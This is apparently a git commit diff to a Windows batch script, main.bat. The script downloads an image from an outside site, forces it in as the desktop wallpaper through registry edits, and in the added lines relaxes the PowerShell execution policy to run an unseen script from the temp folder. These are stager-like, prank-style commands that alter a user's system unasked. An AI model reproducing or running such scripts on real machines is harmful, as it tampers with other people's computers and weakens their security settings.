8eb04f521371ebe6c138cb04afc7b89b40b90502
FGabi01 <46404350+FGabi01@users.noreply.github.com>
2020-03-24 23:29:10 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,9 +1,11 @@
 powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_21693.jpg -OutFile %temp%\hatter.jpg"
 timeout 1
-screenshot.exe %temp%\nem.png
-start %temp%\nem.png
+Powershell.exe set-executionpolicy remotesigned -File  %temp%\ps.ps1
+timeout 1
+start %temp%\open.png
+timeout 1
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
-reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /f /d %tmp%\hatter.jpg
+reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /f /d %temp%\hatter.jpg
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
 timeout 3
